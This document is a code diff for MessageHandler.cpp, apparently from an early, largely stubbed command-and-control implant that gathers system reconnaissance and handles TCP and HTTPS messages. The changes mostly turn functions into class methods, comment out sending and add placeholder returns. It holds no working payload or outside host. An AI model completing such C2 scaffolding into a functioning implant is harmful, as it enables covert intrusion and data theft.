@@ -1,5 +1,7 @@
 /* MessageHandler.cpp */
 
+#include "C2Profile.h"
+#include "MessageHandler.h"
 #include "MessageTypes.h"
 #include "MessagePublisher.h"
 #include "recon.h"
@@ -10,7 +12,7 @@
 // the message. 
 //int processMessage(BYTE* payload, MessageHeader* header)
 // int processIncomingMessage(InternalMessage* msg, Config* config)
-int processMessage(InternalMessage* msg, Config* config) // NOTE: passing the config around is actual cancer... i wish i was writing this in c++
+bool MessageHandler::processMessage(InternalMessage* msg, Config* config) // NOTE: passing the config around is actual cancer... i wish i was writing this in c++
 {
 	switch (msg->header.messageType) {
 		case SYSTEM_INFO:
@@ -19,11 +21,11 @@ int processMessage(InternalMessage* msg, Config* config) // NOTE: passing the co
 			int status = generateReconMessage(&reconMessage);
 
 			// TODO: convert InternalMessage from processMessage into an InternalMessage.payload
-			InternalMessage* response = malloc(sizeof(InternalMessage));
+			InternalMessage* response = (InternalMessage *)malloc(sizeof(InternalMessage));
 			memcpy(response->payload, &reconMessage, sizeof(ReconMessage));
 			response->header.payload_size = sizeof(ReconMessage);
 			//return send(msg->header.message_id);
-			status |= send(response, config);
+			//status |= send(response, config);
 			return status;
 		}
 
@@ -77,7 +79,7 @@ bool MessageHandler::receiveMessages(uint8_t* buffer, size_t bytes_received)
 
 	return false; // if no errors, return 0
 }
-int handleTCP(uint8_t* rawData, size_t rawDataLength, InternalMessage* resultMsg, Config* config)
+bool MessageHandler::handleTCP(uint8_t* rawData, size_t rawDataLength, InternalMessage* resultMsg, Config* config)
 {
 	// Raw Bytes from Socket
 	uint8_t buf[4096]; // TODO: rename to plaintext?
@@ -115,6 +117,7 @@ int handleTCP(uint8_t* rawData, size_t rawDataLength, InternalMessage* resultMsg
 
 	// TODO: cleanup/free buf
 }
+/*
 int handleHTTPS(uint8_t* data)
 {
 	// HTTPS Text Message
@@ -135,13 +138,8 @@ int handleHTTPS(uint8_t* data)
 
 	// EXECUTE (InternalMessage)
 
-}
+}*/
 
-
-int compressData(uint8_t* buf) 
-{
-
-}
 
 ///////////////////////
 
@@ -175,6 +173,7 @@ bool MessageHandler::sendMessage(); // overload this function?
 	// Frame (if needed)
 	// Raw Bytes
 	// Send
+	return false;
 }
 
 // TODO: setup a listener function that calls this function?
@@ -193,4 +192,5 @@ bool MessageHandler::recvMessage(); // overload this function?
 	// Obtain InternalMessage object
 	// Validate
 	// handle InternalMessage (based on its header)
+	return false;
 }
